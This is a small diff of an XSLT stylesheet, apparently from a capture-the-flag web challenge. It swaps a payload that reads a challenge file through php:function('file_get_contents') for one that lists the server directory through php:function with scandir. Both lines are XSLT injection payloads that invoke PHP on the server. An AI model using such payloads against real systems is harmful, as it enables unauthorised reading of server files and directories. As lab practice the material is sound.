@@ -3,7 +3,7 @@
 
 
    
-   <xsl:value-of select="php:function('file_get_contents','file:///challenge/web-serveur/ch50/' )"/>
+   <xsl:value-of select="php:function('implode',',',scandir('.') )"/>
    
    </xsl:template>
 </xsl:stylesheet>
